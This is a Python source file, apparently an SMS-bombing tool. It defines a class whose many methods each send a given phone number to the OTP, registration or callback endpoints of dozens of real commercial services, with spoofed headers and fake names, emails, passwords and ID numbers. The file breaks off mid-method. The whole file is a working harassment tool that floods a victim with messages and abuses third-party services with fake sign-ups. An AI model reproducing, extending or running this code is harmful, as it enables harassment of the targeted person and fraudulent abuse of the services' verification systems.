import requests, json, random
from bs4 import BeautifulSoup as bs
from random import randint
from data import *

data_headers = {'X-Requested-With':'XMLHttpRequest',
 'Connection':'keep-alive',
 'Pragma':'no-cache',
 'Cache-Control':'no-cache',
 'Accept-Encoding':'gzip, deflate, br',
 'User-Agent':user_agent(),
 'DNT':'1'}

def phone_mask(phone, maska):
    str_list = list(phone)
    for xxx in str_list:
        maska = maska.replace('#', xxx, 1)
    else:
        return maska


class Service:

    def __init__(self):
        pass 

    def number(self, number_phone):
        self.phone = number_phone
        if self.phone[0] == '+':
            self.phone_not_pluse = str(number_phone[1:])
            self.phone_mask = str(phone_mask(phone=(self.phone_not_pluse), maska='+# (###) ###-##-##'))
            if self.phone[1] == '3':
                self.country_code = '380'
            else:
                if self.phone[1] == '7':
                    self.country_code = '7'
                else:
                    if self.phone[1] == '8':
                        self.country_code = '7'
                    else:
                        if self.phone[1] == '9':
                            self.country_code = '998'
                        else:
                            self.country_code = str(self.phone[1]) + str(self.phone[2])
        else:
            if isinstance(int(self.phone), int):
                self.phone_not_pluse = str(number_phone)
                self.phone_mask = str(phone_mask(phone=number_phone, maska='+# (###) ###-##-##'))
                if self.phone[0] == '3':
                    self.country_code = '380'
                else:
                    if self.phone[0] == '7':
                        self.country_code = '7'
                    else:
                        if self.phone[1] == '8':
                            self.country_code = '7'
                        else:
                            if self.phone[0] == '9':
                                self.country_code = '998'
                            else:
                                self.country_code = str(self.phone[0]) + str(self.phone[1])
                self.phone = '+' + str(number_phone)

    def benzuber(self):
        requests.post('https://app.benzuber.ru/login', data={'phone': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def cinema5(self):
        requests.post('https://cinema5.ru/api/phone_code',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def citilink(self):
        requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{self.phone_not_pluse}/",
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def city24(self):
        requests.post('https://city24.ua/personalaccount/account/registration',
          data={'PhoneNumber': self.phone_not_pluse},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def studio(self):
        password = password()
        requests.post('https://cross-studio.ru/ajax/lk/send_sms',
          data={'phone':self.phone_mask,
         'email':email(),
         'pass':password,
         'pass1':password,
         'name':username(),
         'fename':username(),
         'hash':''},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def dianet(self):
        requests.post('https://my.dianet.com.ua/send_sms/',
          data={'phone': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def dns_shop(self):
        requests.post('https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/',
          params={'phone':self.phone,
         'is_repeat':0,  'order_guid':1},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def eldorado(self):
        requests.get('https://api.eldorado.ua/v1/sign/',
          params={'login':self.phone,
         'step':'phone-check',
         'fb_id':'null',
         'fb_token':'null',
         'lang':'ru'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def finam(self):
        requests.post('https://www.finam.ru/api/smslocker/sendcode',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def dgtl(self):
        requests.post('https://i-dgtl.ru/curl/flashcall.php',
          data={'check':'',
         'flashcall-code':randint(1000, 9999),
         'flashcall-tel':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})
        requests.post('https://i-dgtl.ru/curl/sms.php',
          data={'check':'',
         'flashcall-tel':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def flipkart(self):
        requests.post('https://www.flipkart.com/api/5/user/otp/generate',
          headers={'Origin':'https://www.flipkart.com',
         'X-user-agent':'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop'},
          data={'loginId': self.phone})
        requests.post('https://www.flipkart.com/api/6/user/signup/status',
          headers={'Origin':'https://www.flipkart.com',
         'X-user-agent':'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop'},
          json={'loginId':self.phone,
         'supportAllStates':True})

    def foodband(self):
        requests.post('https://foodband.ru/api?call=calls',
          data={'customerName':_ru_name_(),
         'phone':self.phone_mask,
         'g-recaptcha-response':''},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})
        requests.get('https://foodband.ru/api/',
          params={'call':'customers/sendVerificationCode',
         'phone':self.phone,
         'g-recaptcha-response':''},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def gazprom(self):
        requests.post('https://www.gazprombank.ru/rest/sms.send',
          json={'phone':self.phone_mask,
         'type':'debit_card'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def getmancar(self):
        requests.post('https://crm.getmancar.com.ua/api/veryfyaccount',
          json={'phone':'+' + self.phone,
         'grant_type':'password',
         'client_id':'gcarAppMob',
         'client_secret':'SomeRandomCharsAndNumbersMobile'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def ginzadelivery(self):
        requests.post('https://ginzadelivery.ru/v1/auth',
          json={'phone': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def grinica(self):
        requests.post('https://grilnica.ru/loginphone/',
          data={'step':0,
         'phone':phone_mask(self.phone_not_pluse, '+# (###) ###-####'),
         'code':'',
         'allow_sms':'on',
         'apply_offer':'on'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def gurutaxi(self):
        requests.post('https://guru.taxi/api/v1/driver/session/verify',
          json={'phone': {'code':1,  'number':self.phone}},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def hatimaki(self):
        requests.post('https://www.hatimaki.ru/register/',
          data={'REGISTER[LOGIN]':self.phone,
         'REGISTER[PERSONAL_PHONE]':self.phone,
         'REGISTER[SMS_CODE]':'',
         'resend-sms':'1',
         'REGISTER[EMAIL]':'',
         'register_submit_button':'Зарегистрироваться'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def helsi(self):
        requests.post('https://helsi.me/api/healthy/accounts/login',
          json={'phone':self.phone,
         'platform':'PISWeb'},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def hmara(self):
        requests.get('https://api.hmara.tv/stable/entrance',
          params={'contact': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def icq(self):
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
          data={'msisdn':self.phone,
         'locale':'en',
         'countryCode':'ru',
         'version':'1',
         'k':'ic1rtwz1s1Hj1O0r',
         'r':'46763'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def ievaphone(self):
        requests.get('https://ievaphone.com/call-my-phone/web/request-free-call',
          params={'phone':self.phone,
         'domain':'IEVAPHONE',
         'browser':'undefined'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def imgur(self):
        requests.post('https://api.imgur.com/account/v1/phones/verify',
          json={'phone_number':self.phone,
         'region_code':'RU'},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def indriver(self):
        requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru',
          data={'mode':'request',
         'phone':self.phone,
         'phone_permission':'unknown',
         'stream_id':0,
         'v':3,
         'appversion':'3.20.6',
         'osversion':'unknown',
         'devicemodel':'unknown'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def ingos(self):
        requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
          headers={'Referer':'https://www.ingos.ru/cabinet/registration/personal',
         'User-Agent':user_agent(),  'DNT':'1'},
          json={'Birthday':'1986-07-10T07:19:56.276+02:00',
         'DocIssueDate':'2004-02-05T07:19:56.276+02:00',
         'DocNumber':randint(500000, 999999),
         'DocSeries':randint(5000, 9999),
         'FirstName':_ru_name_(),
         'Gender':'M',
         'LastName':_ru_name_(),
         'SecondName':_ru_name_(),
         'Phone':self.phone,
         'Email':email()})

    def invitro(self):
        requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword',
          data={'password':password(),
         'application':'lkp',
         'login':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def iqlab(self):
        requests.post('https://iqlab.com.ua/session/ajaxregister',
          data={'cellphone': self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def ivi(self):
        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def iwant(self):
        requests.post('https://i-want.ru/api/auth/v1/customer/login/phone',
          json={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def izi(self):
        requests.post('https://izi.ua/api/auth/register',
          json={'phone':'+' + self.phone,
         'name':_ru_name_(),
         'is_terms_accepted':True},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})
        requests.post('https://izi.ua/api/auth/sms-login',
          json={'phone': '+' + self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def kant(self):
        requests.post('https://www.kant.ru/ajax/profile/send_authcode.php',
          data={'Phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def karusel(self):
        requests.post('https://app.karusel.ru/api/v1/phone/',
          data={'phone': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def kaspi(self):
        requests.post('https://kaspi.kz/util/send-app-link',
          data={'address': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def kfc(self):
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
          json={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def kilovkusa(self):
        requests.post('https://kilovkusa.ru/ajax.php',
          params={'block':'auth',
         'action':'send_register_sms_code',
         'data_type':'json'},
          data={'phone': f"{self.phone_mask}"},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def kinolab(self):
        requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms',
          headers={'Agent': 'website'},
          json={'Phone':self.phone,
         'Type':1})

    def koronapay(self):
        requests.post('https://koronapay.com/transfers/online/api/users/otps',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def krista(self):
        requests.post('https://kristalnaya.ru/ajax/ajax.php?action=send_one_pas_reg',
          data={'data': '{"phone":"%s"}' % self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def kvivstart(self):
        requests.post('https://cas-api.kyivstar.ua/api/sendSms',
          data={'lang':'uk',
         'msisdn':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def lenta(self):
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
          json={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def levin(self):
        requests.post('https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle',
          json={'url':'/api/client/phone_verification',
         'method':'POST',
         'data':{'client_id':5646981,
          'phone':self.phone,
          'alisa_id':1},
         'headers':{'Client-Id':5646981,
          'Content-Type':'application/x-www-form-urlencoded'}},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def limetaxi(self):
        requests.post('http://212.22.223.149:7200/api/account/register/sendConfirmCode',
          json={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def loany(self):
        requests.post('https://loany.com.ua/funct/ajax/registration/code',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def logistic(self):
        requests.post('https://api-rest.logistictech.ru/api/v1.1/clients/request-code',
          json={'phone': self.phone},
          headers={'Restaurant-chain':'c0ab3d88-fba8-47aa-b08d-c7598a3be0b9',
         'User-Agent':user_agent()})

    def makarolls(self):
        requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php',
          data={'data':self.phone,
         'metod':'postreg'},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def makimaki(self):
        requests.get('https://makimaki.ru/system/callback.php',
          params={'cb_fio':_ru_name_(),
         'cb_phone':phone_mask(self.phone_not_pluse, '+# ### ### ## ##')},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def menuau(self):
        requests.post('https://www.menu.ua/kiev/delivery/registration/direct-registration.html',
          data={'user_info[fullname]':_ru_name_(),
         'user_info[phone]':self.phone,
         'user_info[email]':email(),
         'user_info[password]':password(),
         'user_info[conf_password]':password()})
        requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html',
          data={'phone':self.phone,
         'do':'phone'},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def menzacafe(self):
        requests.get('https://menza-cafe.ru/system/call_me.php',
          params={'fio':_ru_name_(),
         'phone':self.phone,
         'phone_number':'1'})

    def mistercash(self):
        requests.get('https://my.mistercash.ua/ru/send/sms/registration',
          params={'number': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def mngogomenu(self):
        requests.get(f"http://mnogomenu.ru/office/password/reset/{self.phone_mask}", headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})
        requests.post('http://mnogomenu.ru/ajax/callback/send', data={f"uname={name()}&uphone=%2B{phone_mask(phone=(sel.phone[1:]), maska='#+(###)+###+##+##')}"}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def mobileplanet(self):
        requests.post('https://mobileplanet.ua/add_new_user',
          data={'klient_name':_ru_name_(),
         'klient_phone':self.phone,
         'klient_email':email()},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def modulbank(self):
        requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone',
          json={'FirstName':_ru_name_(),
         'CellPhone':self.phone,
         'Package':'optimal'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def molbulak(self):
        requests.post('https://www.molbulak.ru/ajax/smsservice.php',
          data={'command':'send_code_loan',
         'phone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def moneymanu(self):
        requests.post('https://moneyman.ru/registration_api/actions/send-confirmation-code',
          data=(self.phone),
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def monobank(self):
        requests.post('https://www.monobank.com.ua/api/mobapplink/send',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def mospizza(self):
        requests.post('https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php',
          data={'name':_ru_name_(),
         'phone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def moyo(self):
        requests.post('https://www.moyo.ua/identity/registration',
          data={'firstname':name(),
         'phone':self.phone,
         'email':email()},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def mtstv(self):
        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
          params={'msisdn': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def multiplex(self):
        requests.post('https://auth.multiplex.ua/login',
          json={'login': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def mygames(self):
        requests.post('https://account.my.games/signup_send_sms/',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def niyama(self):
        requests.post('https://www.niyama.ru/ajax/sendSMS.php',
          data={'REGISTER[PERSONAL_PHONE]':self.phone,
         'code':'',
         'sendsms':'Выслать код'})

    def nl(self):
        requests.post('https://www.nl.ua',
          data={'component':'bxmaker.authuserphone.login',
         'sessid':'bf70db951f54b837748f69b75a61deb4',
         'method':'sendCode',
         'phone':self.phone,
         'registration':'N'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def nncard(self):
        requests.post('https://nn-card.ru/api/1.0/register',
          json={'phone':self.phone,
         'password':password()},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def nova(self):
        name = ''.join(random.choices('Іїє', k=(random.randint(3, 5))))
        requests.post('https://api.novaposhta.ua/v2.0/json/LoyaltyUserGeneral/registration',
          json={'modelName':'LoyaltyUserGeneral',
         'calledMethod':'registration',
         'system':'PA 3.0',
         'methodProperties':{'City':'8d5a980d-391c-11dd-90d9-001a92567626',
          'FirstName':name,
          'LastName':name,
          'Patronymic':name,
          'Phone':f"{self.phone}",
          'Email':email(),
          'BirthDate':'06.06.2010',
          'Password':'0c465655c53d2d8ec971581f5dfdbd83',
          'Gender':'M',
          'CounterpartyType':'PrivatePerson',
          'MarketplacePartnerToken':'005056887b8d-b5da-11e6-9f54-cea38574'}},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def ok(self):
        requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
          data={'st.r.phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def okean(self):
        requests.get('https://okeansushi.ru/includes/contact.php',
          params={'call_mail':'1',
         'ajax':'1',
         'name':_ru_name_(),
         'phone':self.phone,
         'call_time':'1',
         'pravila2':'on'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def oldi(self):
        requests.post('https://www.oldi.ru/ajax/reg.php',
          data={'method':'isUserPhone',
         'phone':self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def ollis(self):
        requests.post('https://www.ollis.ru/gql',
          json={'query': 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }' % self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def onlineua(self):
        requests.get('https://secure.online.ua/ajax/check_phone/',
          params={'reg_phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def osaka(self):
        requests.post('https://www.osaka161.ru/local/tools/webstroy.webservice.php',
          data={'name':'Auth.SendPassword',
         'params[0]':self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def ozon(self):
        requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
          json={'phone':self.phone,
         'otpId':0},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def panpizza(self):
        requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode',
          data={'telephone': '8' + self.phone[1:]},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def pirogin(self):
